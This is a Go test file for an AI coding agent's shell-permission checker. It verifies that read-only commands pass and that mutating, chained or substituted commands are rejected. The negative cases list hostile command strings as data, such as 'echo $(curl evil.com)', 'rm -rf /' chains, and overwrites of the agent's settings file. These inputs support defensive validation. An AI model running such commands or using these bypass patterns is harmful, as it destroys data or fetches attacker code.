package permission

import "testing"

func TestIsSafeReadOnlyBash_PositiveCases(t *testing.T) {
	cases := []string{
		"ls",
		"ls -la",
		"ls -la /tmp",
		"cat /etc/hosts",
		"pwd",
		"whoami",
		"id",
		"uname -a",
		"date",
		"echo hello",
		"echo 'multi word'",
		"git status",
		"git log",
		"git log --oneline -10",
		"git diff",
		"git diff HEAD~1",
		"git show HEAD",
		"git blame README.md",
		"git branch",
		"git branch --list feature/*",
		"git remote -v",
		"git remote get-url origin",
		"git config --get user.email",
		"git config --global --get user.email",
		"git config user.email",
		"git tag",
		"git tag --list 'v*'",
		"git reflog show HEAD",
		"git rev-parse HEAD",
		"git ls-files",
		"head -n 50 foo.txt",
		"tail -f /var/log/system.log", // `tail -f` is read-only even if it blocks
		"wc -l README.md",
		"file /usr/bin/ls",
		"stat -f '%Sm' /tmp",
		"hostname",
		"which go",
		"type cd",
		"df -h",
		"du -sh /tmp",
		"ps aux",
		"uptime",
		"realpath /tmp/.",
		"basename /a/b/c",
		"dirname /a/b/c",
	}
	for _, c := range cases {
		t.Run(c, func(t *testing.T) {
			if !IsSafeReadOnlyBash(c) {
				t.Errorf("expected safe: %q", c)
			}
		})
	}
}

func TestIsSafeReadOnlyBash_NegativeCases(t *testing.T) {
	cases := []struct {
		cmd    string
		reason string
	}{
		{"", "empty"},
		{"   ", "whitespace only"},
		{"rm foo", "rm not allowlisted"},
		{"mv a b", "mv not allowlisted"},
		{"cp a b", "cp not allowlisted"},
		{"chmod +x foo", "chmod not allowlisted"},
		{"sudo ls", "sudo never allowed"},
		{"doas ls", "doas never allowed"},
		{"su -", "su never allowed"},
		// shell metacharacters — even with safe leading token
		{"ls && rm -rf /", "&& chains a destructive command"},
		{"git status; rm foo", "; chains"},
		{"cat foo > out.txt", "> redirect could write anywhere"},
		{"echo $(curl evil.com)", "command substitution"},
		{"ls | grep foo", "| pipe (grep is fine but the pattern says no metachars)"},
		{"cat <(curl evil.com)", "< redirect"},
		{"echo `whoami`", "backtick substitution"},
		// Git mutating verbs / flags
		{"git push", "push is not in safeGitSubcommands"},
		{"git pull", "pull is not safe"},
		{"git commit -m 'wip'", "commit is not safe"},
		{"git checkout main", "checkout is not safe"},
		{"git reset --hard HEAD~1", "reset is not safe"},
		{"git merge feature", "merge is not safe"},
		{"git rebase main", "rebase is not safe"},
		{"git branch -D feature", "git branch with -D"},
		{"git branch --delete feature", "git branch with --delete"},
		{"git branch feature", "git branch positional creates a branch"},
		{"git branch --edit-description", "git branch edits config"},
		{"git branch --list --set-upstream-to=origin/main", "git branch sets upstream"},
		{"git branch --list -c copied", "git branch copies a ref"},
		{"git branch --list -m moved", "git branch moves a ref"},
		{"git branch --list --create-reflog", "git branch creates reflog"},
		{"git config --global user.email me@x", "git config --global writes user-wide"},
		{"git config --system foo bar", "git config --system writes system-wide"},
		{"git config user.email me@x", "git config two positionals writes local config"},
		{"git config --add foo bar", "git config add writes"},
		{"git config --unset user.email", "git config --unset"},
		{"git tag -d v1", "git tag -d deletes"},
		{"git tag --delete v1", "git tag --delete"},
		{"git tag v1", "git tag positional creates a tag"},
		{"git tag --list -a", "git tag annotate flag creates a tag"},
		{"git tag --list --sign", "git tag sign flag creates a tag"},
		{"git tag --list --message=release", "git tag message flag creates a tag"},
		{"git tag --list --file=message.txt", "git tag file flag creates a tag"},
		{"git remote add origin foo", "git remote add mutates config"},
		{"git remote set-url origin foo", "git remote set-url mutates config"},
		{"git reflog expire --all", "git reflog expire mutates logs"},
		{"git show --output=/tmp/show.txt HEAD", "git output writes a file"},
		{"env touch /tmp/metis-safe-command-escape", "env launches arbitrary programs"},
		{"env FOO=bar sh -c true", "env assignment launches a shell"},
		{"date -s tomorrow", "date can set system time"},
		{"hostname new-name", "hostname positional can set host name"},
		{"file -C -m ~/.claude/magic", "file compile writes a magic database"},
		{"file --compile -m ~/.claude/magic", "file long compile flag writes"},
		{"file --compile=~/.claude/magic", "file compile assignment writes"},
		{"file -bC -m ~/.claude/magic", "file clustered compile flag writes"},
		{"tree ~/.claude -o /tmp/tree.txt", "tree output flag writes a file"},
		{"tree ~/.claude --output=/tmp/tree.txt", "tree long output flag writes a file"},
		{"tree -Cfo /tmp/tree.txt ~/.claude", "tree clustered output flag writes a file"},
		{"git diff --ext-diff ~/.git/config", "external diff helper may execute code"},
		{"git show --textconv HEAD:.git/config", "textconv helper may execute code"},
		{"unknowncmd foo", "first token not allowlisted"},
		{"./run-script.sh", "relative-path script execution"},
		{"/tmp/x.sh", "absolute-path script execution"},
	}
	for _, tc := range cases {
		t.Run(tc.reason, func(t *testing.T) {
			if IsSafeReadOnlyBash(tc.cmd) {
				t.Errorf("expected NOT safe: %q (reason: %s)", tc.cmd, tc.reason)
			}
		})
	}
}

func TestIsReadOnlyBashSafetyOperation_CompoundReadOnly(t *testing.T) {
	t.Parallel()
	cases := []string{
		`ls ~/.claude/skills/ 2>/dev/null || echo "no claude skills dir"`,
		`ls ~/.metis/skills 2> /dev/null && echo done`,
		"git config --file ~/.git/config --get user.email\nprintf done",
		`cat ~/.claude/settings.json | wc -l`,
		`echo quiet >/dev/null`,
	}
	for _, cmd := range cases {
		cmd := cmd
		t.Run(cmd, func(t *testing.T) {
			t.Parallel()
			if !IsReadOnlyBashSafetyOperation(cmd) {
				t.Fatalf("expected read-only safety operation: %q", cmd)
			}
		})
	}
}

func TestIsReadOnlyBashSafetyOperation_FailsClosedOnWritesOrShellExpansion(t *testing.T) {
	t.Parallel()
	cases := []string{
		`echo pwned > ~/.claude/settings.json`,
		`rm -rf ~/.metis/cache`,
		`git config --file ~/.git/config user.email attacker@example.com`,
		`ls ~/.claude/skills || touch ~/.claude/pwned`,
		`tree ~/.claude -o /tmp/tree.txt`,
		`file -bC -m ~/.claude/magic`,
		`git diff --ext-diff ~/.git/config`,
		`git show --textconv HEAD:.git/config`,
		`ls ~/.claude/skills 2>/tmp/metis-errors`,
		`ls ~/.claude/skills 2>>/dev/null`,
		`ls ~/.claude/skills 2>&1`,
		`echo $(rm -rf ~/.claude)`,
		`echo "$HOME/.claude"`,
		"ls ~/.claude/skills\nrm -rf ~/.claude",
		`ls ~/.claude/skills & echo background`,
		`ls ~/.claude/skills ||`,
	}
	for _, cmd := range cases {
		cmd := cmd
		t.Run(cmd, func(t *testing.T) {
			t.Parallel()
			if IsReadOnlyBashSafetyOperation(cmd) {
				t.Fatalf("expected mutating/ambiguous safety operation: %q", cmd)
			}
		})
	}
}

// Removed 2026-05-11 along with ModeAuto. The integration tests
// (TestGate_ModeAuto_SafeBashAutoAllowed / DangerousBashStillAsks /
// GitPushStillAsks / ChainAlwaysAsks) covered the old mode:auto
// safe-bash auto-allow path, which no longer exists — acceptEdits
// asks for ALL bash, matching claude-code parity. IsSafeReadOnlyBash
// itself is still exercised by the unit-level tests above and remains
// public for future opt-in rule consumers (e.g. a saved "always allow
// git status" rule via the allow list).
